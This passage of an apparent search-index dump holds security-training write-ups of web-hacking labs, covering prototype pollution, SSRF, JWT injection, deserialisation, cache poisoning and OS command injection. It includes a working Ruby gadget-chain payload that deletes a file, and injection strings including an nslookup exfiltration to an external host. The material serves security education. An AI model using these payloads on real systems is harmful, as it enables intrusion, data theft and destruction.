    "c": "Prototype pollution  Prototype Pollution occurs when an attacker manipulates __proto__ (See ECMAScript® 2015 Language Specification ), usually by adding a new Prototype onto __proto__ . Since __proto__ exists for every Object , and every Objects inherits the Prototypes from their Prototype , this addition is inherited by all the JavaScript Objects through the prototype chain. Detecting these vulnerabilities requires reading and understanding a lot of JavaScript code, which can be time-consuming. Malicious players can take advantage of the ability to insert properties into existing JavaScript code, and execute either Denial of Service attacks, by triggering JavaScript exceptions, or Remote Code Execution, by injecting malicious code. In short, it is an injection attack that targets JavaScript runtimes. JavaScript can run on the client-side and server-side of a web application, and prototype pollution vulnerabilities can exist on both sides. Steps  Client-side prototype pollution (CSPP)  Find prototype pollution sources Testing a prototype pollution sources/Try to modify the prototype Find possible prototype pollution gadgets Try the Burpsuite DOM Invader browser extension Server-side prototype pollution (SSPP)  Polluted property reflection If no reflection, try: Status code override JSON spaces override Charset override Try the Server-Side Prototype Pollution Scanner extension Prototype pollution sources  Prototype pollution is a vulnerability that occurs when merging an object with a user controlled JSON object. It can also occur as a result of an object generated from query/hash parameters, when the merge operation does not sanitise the keys. This makes it possible to use property keys like __proto__ , by which arbitrary assignments to the Object.prototype (or other global prototypes) can be created. When this happens, it is referred to as a prototype pollution source. Detecting CSPP with DOM Invader  DOM Invader is a browser-based tool that helps test for DOM XSS vulnerabilities using a variety of sources and sinks, including both web message and prototype pollution vectors. It is available via Burp’s built-in browser, where it comes preinstalled as an extension. When enabled (if the BurpSuite icon is not visible, pin it under the jigsaw first ), DOM Invader adds a new tab to the browser’s DevTools panel. To use it for finding CSPP (client-side prototype pollution), turn it on in the DOM Invader settings. And try some DOMInvader prototype pollution test cases like prototype-pollution-query-string-gadget to check it works: See this Portswigger vid for the entire explanation. To confirm the vulnerability, click on Test and in the new tab that appears Inspect element -> DOM Invader to view Object : Type Object.prototype and enter: To find gadgets, click on Scan for Gadgets and in the new tab that appears Inspect element -> DOM Invader In this example, DOM Invader has discovered a gadget called “html”, which ends up in an innerHTML sink. A green “Exploit” button has appeared, combining the source discovered with the gadget and automatically creating a prototype pollution exploit. Detecting SSPP with the Server-Side Prototype Pollution Scanner  Server-Side Prototype Pollution Scanner Install the Server-Side Prototype Pollution Scanner extension from the BApp Store and make sure that it is enabled. Explore the target website using Burp’s browser to map as much of the content as possible and accumulate traffic in the proxy history. In Burp, go to the Proxy -> HTTP history tab. Filter the list to show only in-scope items. Select all items in the list. Right-click your selection and go to Extensions -> Server-Side Prototype Pollution Scanner -> Server-Side Prototype Pollution , then select one of the scanning techniques from the list. When prompted, modify the attack configuration if required, then click OK to launch the scan. In Burp Suite Professional, the extension reports and prototype pollution sources it finds via the Issue activity panel on the Dashboard and Target tabs. If you’re using Burp Suite Community Edition, you need to go to the Extensions -> Installed tab, select the extension, then monitor its Output tab for any reported issues. Bypassing input filters for server-side prototype pollution  Websites often attempt to prevent or patch prototype pollution vulnerabilities by filtering suspicious keys like __proto__ . This key sanitisation approach is not a robust long-term solution as there are a number of ways it can potentially be bypassed: Obfuscate the prohibited keywords, so they’re missed during the sanitization. Access the prototype via the constructor property instead of __proto__ . Escalation  Impact varies, depending on the application logic and implementation, and includes DoS, and interfering with the JavaScript environment. It is also a starting point for further attacks: A prototype pollution attack allows for leveraging gadgets loaded in the same context. These can potentially be used for escalating privileges or gaining access to sensitive information. Client-side exploitation of a prototype pollution (CSPP) vulnerability can result in several attacks, such as cross-site scripting (XSS) attacks. In this case, threat actors look for a gadget that relies on the property of an object susceptible to pollution. If the object interacts with the page’s document object model (DOM) , threat actors can trigger client-side JavaScript code execution. Server-side exploitation (SSPP) can lead to more severe consequences, including remote code execution (RCE) , SQL injection (SQLi) , and authorisation and authentication bypasses. Portswigger labs  DOM XSS via client-side prototype pollution DOM XSS via an alternative prototype pollution vector Client-side prototype pollution via flawed sanitization Client-side prototype pollution in third-party libraries Client-side prototype pollution via browser APIs Privilege escalation via server-side prototype pollution Detecting server-side prototype pollution without polluted property reflection Bypassing flawed input filters for server-side prototype pollution Remote code execution via server-side prototype pollution Exfiltrating sensitive data via server-side prototype pollution Remediation  Object.freeze will mitigate almost all cases. It blocks all changes to an object’s attributes. A prototype is an object which can be frozen like any regular object. Invoke the Object.freeze(Object.prototype) element to freeze the default prototype and prevent it from being polluted. The nopp npm package freezes all common object prototypes automatically. Using schema validation to ensure that the JSON data contains the expected attributes. This will remove __proto__ if it appears in the JSON. Use Map primitive (See ECMAScript® 2015 Language Specification ). Use the Object.create() method instead of the object constructor Object() or the object-literal {} when creating a new object. This allows for setting the created object’s prototype directly using the first argument passed to the Object.create() element. Objects created using the Object.create(null) function will not have the __proto__ attribute. In general, pay attention when merging two objects recursively, recursively nesting properties, deep cloning of objects, and creating objects by recursively zipping properties with values. These are more prone to Prototype Pollution vulnerabilities than other functions. Whenever a library recursively sets a nested property, it must sanitise the untrusted inputs. Use safe open source libraries when recursively setting object’s properties. Resources  HoLyVieR/prototype-pollution-nsec18 Prototype pollution – and bypassing client-side HTML sanitizers BlackFan/client-side-prototype-pollution Portswigger: What is prototype pollution? Finding client-side prototype pollution with DOM Invader Daily Swig:Prototype pollution: The dangerous and underrated vulnerability impacting JavaScript applications , August 2020...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6c79b9a319d498460cfb157b996a7f95",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/race",
    "t": "Race conditions ",
    "c": "Race conditions  A race condition happens when two sections of code that are designed to be executed in a sequence get executed out of sequence. Steps  Spot the features prone to race conditions in the target application and copy the corresponding requests. Send multiple of these critical requests to the server simultaneously. You should craft requests that should be allowed once but not allowed multiple times. Check the results to see if your attack has succeeded. And try to execute the attack multiple times to maximize the chance of success. Consider the impact of the race condition you just found. Draft up the report. Find features prone to race conditions  Attackers use race conditions to subvert access controls. In theory, any application whose sensitive actions rely on access-control mechanisms could be vulnerable. Most of the time, race conditions occur in features that deal with numbers, such as online voting, online gaming scores, bank transfers, e-commerce payments, and gift card balances. Look for these features in an application and take note of the request involved in updating these numbers. Send simultaneous requests  Then test for and exploit race conditions in the target by sending multiple requests to the server simultaneously. Check the results  Check if your attack has succeeded. Whether the attack succeeds depends on the server’s process-scheduling algorithm, which is a matter of luck. However, the more requests you send within a short time frame, the more likely the attack will succeed. Create a Proof of Concept  Once you have found a race condition, you will need to provide proof of the vulnerability in your report. The best way to do this is to lay out the steps needed to exploit the vulnerability. Escalation  Race condition vulnerabilities can have a significant impact on the functionality and security of an application. When determining the impact of a specific race condition, pay attention to how much an attacker can potentially gain in terms of monetary reward or social influence. If a race condition is found on a critical functionality like cash withdrawal, fund transfer, or credit card payment, the vulnerability could lead to infinite financial gain for the attacker. Prove the impact of a race condition and articulate what attackers will be able to achieve. Portswigger lab writeups  Web shell upload via race condition Remediation  The simplest ways to eliminate race conditions are to remove the potential for parallel processing within an application or to ensure that different threads of execution do not share resources. This may not be an option and it can negatively impact program performance. Two options for fixing the issue are the use of thread-safe programming and randomisation. Resources  Portswigger Lab: Web shell upload via race condition How to Prevent Race Conditions in Web Applications Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "881923fddff6aec7214e099461fc4ad1",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/4",
    "t": "JWT authentication bypass via jwk header injection ",
    "c": "JWT authentication bypass via jwk header injection  Description  This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. Reproduction and proof of concept  In Burp, load the JWT Editor extension from the BApp store. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Go to the JWT Editor Keys tab in Burp’s main tab bar. Click New RSA Key . { \"p\": \"8ehx1gw1ogk_7A91WcOc2ZKiS2wel5QsyRXjltp_c8cMR687OEuB8DKR6B7LP7IIc5e1oJ3Vs_V1II63fSGlnMP4jmTwO6ENQmILr4gfrJp2x_KcJLnejeFL3T1EMDtkAgbDKgnijFqnlHfBUiHE_o0k5Nymrcg3dL7HBeZv9NU\", \"kty\": \"RSA\", \"q\": \"628XhjPi2xfpdw3aNT3TLWvXrsb2rJMn5dPVXC6BB7nKPVwv2eAXTOw4JWgcfye7_1vuIOZr3x-TA8sjyTT25tViYIXqPuj6tGRx4soTwjJc3UdwL4vPXCFpO9wmQIckuFzTh1_hjXpHFhLiF_3TcgxKLP4g3ZV7ELZ4lCunNGk\", \"d\": \"AzA7jRuWGB7xz8_AupKhVWZH6ZyS-OBOGUTHApBqheDTaVvELdGvDe55M8YTK8EwZ5nBGgGcSf0coYqPdIRuOkMxWIfPGFJ3274mueBo_Qrf6JASyD8JH8am2e8eeg9GqxG19RwwZ4U9GdaMJKiyi2tDL96BjW8C-NRNyv-GSuuoF0PTXCq0ibaootnWmTXYCHJQ1w4qEiKVjv-e74pS8-v0CwrzUUJV-gXrnzs8e35m0bnWWjLbmzhlExDhfcfbFcBc-64hl4799djt19Zq_waHhAGdTK5XpAAsjtd98GfkymWwWfM1RIHyKKnDp3fxGdpet8TPUEHuILIiADmY6Q\", \"e\": \"AQAB\", \"kid\": \"9a1a93f9-0f9a-4f33-991c-06a5885a3500\", \"qi\": \"YU_yELxttfS0LZJCk3IOnF_v5faOZn_Ftv6Aa1Rl7XqzfrWAzDGbyrto_SUfnzBtw8rMARtLXGbHbdK6R3i4q_7g6nwB8WnMJVmlcPyAlUUt_mEX7f2fNVhUPnFQaW3od5ZPBsqk74NYCXqy-zSVxYeCUeCnuTHxRvrg0RsUrac\", \"dp\": \"VJn-deV_PFQPzvb5C5Ol31GxAL-nU0u2_fxxw-hWep86ZDecdmux3ddRv-RFINmaqxJ7qtiITI-jjudatKB30wOWgfY7Lh99C6JOg-0PZsX-lJ78jLuUYfpRFea_Wj7rEupahvE-EegCg6H-MkMtKfki1gd1I4HKI0I1SJL2xKE\", \"dq\": \"56_lqI37G70GZcDeEjMLVNGh6T-nlOEkDEpQ12x0UhQF8Ch-dpzOkUaNYlJ4aLHDkmL3jqzzTxoVZVBNoT5cE4G-VFq00MAZp9iJMrPGif9h3-jjgAbIQ1Ql6WCWzD2yZzQCfmBe6QmCVziyAwYpRTzO6kQUN7tY5nOLadUjsLE\", \"n\": \"3nlag4vyBQ2KmOwusjblF8_XodPeU1eNaNU3Wqxqpn3dTJGxQQkqEtBoLzphZJqVcNBs9Tk_36zEJapHkU9zAQAY__lbRkTevL-8acoiDotmZYXaELZxMktCu2Ae2QZmKsI0aye6sO3XAD6u5vMKdQLSljtlcXg9jgJ8gUdr2ZATJpb0RHlwXYTKE2xvm0fkL5BWSfqod-n2JCq5bt-ARZljlkjlHn1MNXOfl1s7Z3dDoSpaS42iGBkwZqeSj_FyhndpTsbtvyJ5shYwEYohCZ02k_WnaiwyMhT8fCnaR7OBTJ67rAOHqcpBxdShLOiosLrKwTwV2AGIJliGv5mvXQ\" } In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don’t need to select a key size as this will automatically be updated later. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token tab. In the payload, change the value of the sub claim to administrator. At the bottom of the JSON Web Token tab, click Attack , then select Embedded JWK . When prompted, select your newly generated RSA key and click OK . In the header of the JWT, a jwk parameter has been added containing the public key. Send the request. Observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; modify and sign a JWT that gives access to the admin panel at /admin ; then delete the user carlos . Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a jwk parameter to the header of the JWT manually. In this case, you need to also update the kid header of the token to match the kid of the embedded key.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1757296a2c13473d34566ea685c5ce7c",
    "u": "https://webapp.tymyrddin.dev/docs/dom/5",
    "t": "DOM-based cookie manipulation ",
    "c": "DOM-based cookie manipulation  Description  This lab demonstrates DOM-based client-side cookie manipulation. Reproduction and proof of concept  Analysis: Product pages contain a script which stores the current page by URL in the cookie: <script> document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure' </script> The script stores the current page by url in the cookie: Requests are sent with that cookie and the page contains a Last viewed product link: Ana accepts any target: Trying injecting arbitrary HTML and JavaScript: Go to the exploit server and add the payload iframe to the body: Store the exploit and deliver it to the victim. The original source of the iframe matches the URL of one of the product pages, except there is a JavaScript payload added to the end. When the iframe loads for the first time, the browser temporarily opens the malicious URL, which is then saved as the value of the lastViewedProduct cookie. The onload event handler ensures that the victim is then immediately redirected to the home page, unaware that this manipulation ever took place. While the victim’s browser has the poisoned cookie saved, loading the home page will cause the payload to execute. Exploitability  An attacker needs to inject a cookie that will cause XSS on a different page and call the print() function. The attacker will need to use an exploit server to direct the victim to the correct pages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "18b5f1998b8b1c919442d43dc2a6fd6c",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Insecure deserialisation Labs Introduction  What?  Insecure deserialisation is when user-controllable data is deserialised by a website. Why?  This potentially enables an attacker to manipulate serialised objects in order to pass harmful data into the application code. How?  Insecure deserialisation vulnerabilities Modifying serialised objects Modifying serialised data types Using application functionality to exploit insecure deserialisation Arbitrary object injection in PHP Exploiting Java deserialisation with Apache Commons Exploiting PHP deserialisation with a pre-built gadget chain Exploiting Ruby deserialisation using a documented gadget chain Developing a custom gadget chain for Java deserialisation Developing a custom gadget chain for PHP deserialisation Using PHAR deserialisation to deploy a custom gadget chain",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "4a04d959fc1e87761e043a54f110462d",
    "u": "https://webapp.tymyrddin.dev/docs/pollution/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Prototype pollution Labs Introduction  What?  Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global prototypes, which may then be inherited by user-defined objects. Why?  Depending on the exact logic of the application, prototype pollution can lead to practically all popular web vulnerabilities: remote code execution (RCE), cross-site scripting ( XSS ), SQL injection, and so on. How?  Prototype pollution DOM XSS via client-side prototype pollution DOM XSS via an alternative prototype pollution vector Client-side prototype pollution via flawed sanitization Client-side prototype pollution in third-party libraries Client-side prototype pollution via browser APIs Privilege escalation via server-side prototype pollution Detecting server-side prototype pollution without polluted property reflection Bypassing flawed input filters for server-side prototype pollution Remote code execution via server-side prototype pollution Exfiltrating sensitive data via server-side prototype pollution",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bfc53f93d94845f2a91cc46c04a13641",
    "u": "https://webapp.tymyrddin.dev/docs/auth/6",
    "t": "Broken brute-force protection, IP block ",
    "c": "Broken brute-force protection, IP block  Description  This lab is vulnerable due to a logic flaw in its password brute-force protection. Reproduction and proof of concept  With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached. Enter an invalid username and password, then send the POST /login request to Burp Intruder. Create a pitchfork attack with payload positions in both the username and password parameters. On the Payloads tab, select payload set 1 . Add a list of payloads that alternates between your username and carlos . Make sure that your username is first and that carlos is repeated at least 100 times. Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list. Add this list to payload set 2 and start the attack. When the attack finishes, filter the results to hide responses with a 200 status code. Sort the remaining results by username. There should only be a single 302 response for requests with the username carlos . Make a note of the password from the Payload 2 column. If you get no 302 for carlos and only a few for wiener , throttle the attack by changing the Resource Pool settings for the attack. I throttled it back to only 1 Concurrent Requests. Log in to carlos ’s account using the password that you identified and access his account page to solve the lab. Exploitability  An attacker will need to log into wiener:peter , brute-force the carlos’s password , then log in and access his account page.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f2bf87d9708b54a3d88647e0091bf1f3",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/7",
    "t": "Exploiting Ruby deserialisation using a documented gadget chain ",
    "c": "Exploiting Ruby deserialisation using a documented gadget chain  Description  This lab uses a serialisation-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework. Reproduction and proof of concept  Log in with wiener:peter . The session cookie contains a serialised (“marshaled”) Ruby object. Send a request containing this session cookie to Burp Repeater. Browse the web to find the Universal Deserialisation Gadget for Ruby 2.x-3.x by vakzz on devcraft.io. Copy the final script for generating the payload. Modify the script: Change the command that should be executed from id to rm /home/carlos/morale.txt . Replace the final two lines with puts Base64.encode64(payload) , and the for that required require \"base64\" just above. This ensures that the payload is output in the correct format for use with the lab. # Autoload the required classes Gem::SpecFetcher Gem::Installer # prevent the payload from running when we Marshal.dump it module Gem class Requirement def marshal_dump [@requirements] end end end wa1 = Net::WriteAdapter.new(Kernel, :system) rs = Gem::RequestSet.allocate rs.instance_variable_set('@sets', wa1) rs.instance_variable_set('@git_set', \"rm /home/carlos/morale.txt\") wa2 = Net::WriteAdapter.new(rs, :resolve) i = Gem::Package::TarReader::Entry.allocate i.instance_variable_set('@read', 0) i.instance_variable_set('@header', \"aaa\") n = Net::BufferedIO.allocate n.instance_variable_set('@io', i) n.instance_variable_set('@debug_output', wa2) t = Gem::Package::TarReader.allocate t.instance_variable_set('@io', n) r = Gem::Requirement.allocate r.instance_variable_set('@requirements', t) require \"base64\" payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r]) puts Base64.encode64(payload) Save it, for example, in Downloads and name it gadget.rb , then run the script (Ruby is pre-installed in Kali): $ ruby gadget.rb BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06 OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl LnR4dAY7DFQ7EjoMcmVzb2x2ZQ== Clean it up: $ echo \"BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06 OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==\" | tr -d \"\\n\\r\" BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ== Copy the resulting Base64-encoded object. In Burp Repeater, replace the Base64 session cookie in the Inspector with the malicious one just created. Send the request to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; find the documented exploit and adapt it to create a malicious serialised object containing a remote code execution payload; and then pass this object into the website to delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9c0e82ec1f6a052e5a378b97d1e19082",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/3",
    "t": "SSRF with blacklist-based input filter ",
    "c": "SSRF with blacklist-based input filter  Description  This lab has a vulnerable stock check feature which fetches data from an internal system. Reproduction and proof of concept  Visit a product, click Check stock , intercept the request in Burp Suite, and send it to Burp Repeater. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked. Bypass the block by changing the URL to: http://127.1/ Change the URL to http://127.1/admin and observe that the URL is blocked again. Obfuscate the a in admin by double-URL encoding it to %2561 to access the admin interface and delete the target user. Exploitability  An attacker will need to change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos . The developer has deployed two weak anti-SSRF defenses that the attacker will need to bypass.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5cc5fe7ee5f6ea12af6f5ee526381bb6",
    "u": "https://webapp.tymyrddin.dev/docs/business/2",
    "t": "High-level logic vulnerability ",
    "c": "High-level logic vulnerability  Description  This lab doesn’t adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. Reproduction and proof of concept  With Burp running, log in with wiener:peter and add a cheap item to your cart. In Burp, go to Proxy -> HTTP history and study the corresponding HTTP messages. Notice that the quantity is determined by a parameter in the POST /cart request. Go to the Intercept tab and turn on interception. Add another item to your cart and go to the intercepted POST /cart request in Burp. Change the quantity parameter to an arbitrary integer, then forward any remaining requests. Observe that the quantity in the cart was successfully updated based on your input. Repeat this process, but request a negative quantity this time. Check that this is successfully deducted from the cart quantity. Request a suitable negative quantity to remove more units from the cart than it currently contains. Confirm that you have successfully forced the cart to contain a negative quantity of the product. Go to your cart and notice that the total price is now also a negative amount. Add the leather jacket to your cart as normal. Add a suitable negative quantity of the another item to reduce the total price to less than your remaining store credit. Place the order to solve the lab. Exploitability  An attacker will need to log in and buy a “Lightweight l33t leather jacket” for a price way less than intended.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6c6e16b99d9ba9e2db90c25967d1ee92",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/1",
    "t": "Basic SSRF against the local server ",
    "c": "Basic SSRF against the local server  Description  This lab has a stock check feature which fetches data from an internal system. Reproduction and proof of concept  Browse to /admin and observe that you can’t directly access the admin page. Visit a product, click “Check stock”, intercept the request in Burp Suite, and send it to Burp Repeater. Change the URL in the stockApi parameter to http://localhost/admin . This should display the administration interface. Read the HTML to identify the URL to delete the target user, which is: http://localhost/admin/delete?username=carlos Submit this URL in the stockApi parameter, to deliver the SSRF attack. Exploitability  An attacker will need to change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a1dd23f26ae18fda69315fe745cc454",
    "u": "https://webapp.tymyrddin.dev/docs/cache/9",
    "t": "URL normalisation ",
    "c": "URL normalisation  Description  This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding. Reproduction  In Burp Repeater, browse to any non-existent path, such as GET /random . The path requested is reflected in the error message. Add a suitable reflected XSS payload to the request line: GET /random</p><script>alert(1)</script><p>foo Requesting this URL in the browser, the payload does not execute because it is URL-encoded. In Burp Repeater, poison the cache with the payload and then immediately load the URL in the browser. This time, the alert() is executed because the browser’s encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request. Re-poison the cache then immediately go to the lab and click “Deliver link to victim”. Submit the malicious URL. The lab will be solved when the victim visits the link. PoC  Exploitability  An attacker will need to find the XSS vulnerability, poison the cache to inject a payload that will execute alert(1) in the victim’s browser; and then deliver the malicious URL to the victim.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6fa368aff2b248661c0a29fc09fbeda4",
    "u": "https://webapp.tymyrddin.dev/docs/acl/12",
    "t": "Multistep process with no access control on one step ",
    "c": "Multistep process with no access control on one step  Description  This lab has an admin panel with a flawed multi-step process for changing a user’s role. You can familiarise yourself with the admin panel by logging in using the credentials administrator:admin . Reproduction and proof of concept  Log in using the admin credentials administrator:admin . Browse to the admin panel, promote carlos , and send the confirmation HTTP request to Burp Repeater. Open a private/incognito browser window, and log in with the non-admin credentials wiener:peter . Copy the non-admin user’s session cookie into the existing Repeater request, change the username to yours, and replay it. Exploitability  An attacker will need to exploit the flawed access controls to become an administrator.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ea0c5fc1a9ea27d167b7ae69de885dbd",
    "u": "https://webapp.tymyrddin.dev/docs/os/3",
    "t": "Blind OS command injection with output redirection ",
    "c": "Blind OS command injection with output redirection  Description  This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at: /var/www/images/ The application serves the images for the product catalog from this location. It is possible to redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that submits feedback. Modify the email parameter, changing it to: email=||whoami>/var/www/images/output.txt|| POST /feedback/submit HTTP/1.1 Host: 0ad40078044cb583c02f95a200910010.web-security-academy.net Cookie: session=dUa7zaWcifFtBvIhkwFb4n5GnkIqqMXn User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 138 Origin: https://0ad40078044cb583c02f95a200910010.web-security-academy.net Referer: https://0ad40078044cb583c02f95a200910010.web-security-academy.net/feedback Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close csrf=O2zf4h88FisbEIpRcnTwCACCCH73Tsdp&name=test&email=||whoami>/var/www/images/output.txt||&subject=output+redirection&message=is+possible Now use Burp Suite to intercept and modify the request that loads an image of a product. Modify the filename parameter, changing the value to the name of the file specified for the output of the injected command: filename=output.txt GET /image?filename=output.txt HTTP/1.1 Host: 0ad40078044cb583c02f95a200910010.web-security-academy.net Cookie: session=dUa7zaWcifFtBvIhkwFb4n5GnkIqqMXn User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: image/avif,image/webp,*/* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://0ad40078044cb583c02f95a200910010.web-security-academy.net/product?productId=1 Sec-Fetch-Dest: image Sec-Fetch-Mode: no-cors Sec-Fetch-Site: same-origin Te: trailers Connection: close Observe that the response contains the output from the injected command. Exploitability  An attacker will need to execute the whoami command and retrieve the output.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0dc692e828b9b3a364cf69ce61baeeb5",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/2",
    "t": "Basic SSRF against another back-end system ",
    "c": "Basic SSRF against another back-end system  Description  This lab has a stock check feature which fetches data from an internal system. Reproduction and proof of concept  Visit a product, click Check stock , intercept the request in Burp Suite, and send it to Burp Intruder. Click “Clear §”, change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1), click “Add §”. Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the “From” and “To” and “Step” boxes respectively. Click Start attack . Click on the “Status” column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface. Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos Exploitability  An attacker will need to use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080 , then use it to delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f7cf2e2934b409d6638f4275222d130f",
    "u": "https://webapp.tymyrddin.dev/docs/os/5",
    "t": "Blind OS command injection with out-of-band data exfiltration ",
    "c": "Blind OS command injection with out-of-band data exfiltration  Description  This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. But it is possible to trigger out-of-band interactions with an external domain. Reproduction and proof of concept  Use Burp Suite Professional to intercept and modify the request that submits feedback. Go to the Collaborator tab. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Modify the email parameter, changing it to something like the following: email=||nslookup+`whoami`.hk5vl3zdi4zucr2tr0c14z3qchi860up.oastify.com|| The request now looks like: POST /feedback/submit HTTP/1.1 Host: 0a7000c003c37b04c3374d4e009000bb.web-security-academy.net Cookie: session=qliyIHtpjkwmWtNs0pW8fs7ji2qvW5hA User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 134 Origin: https://0a7000c003c37b04c3374d4e009000bb.web-security-academy.net Referer: https://0a7000c003c37b04c3374d4e009000bb.web-security-academy.net/feedback Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close 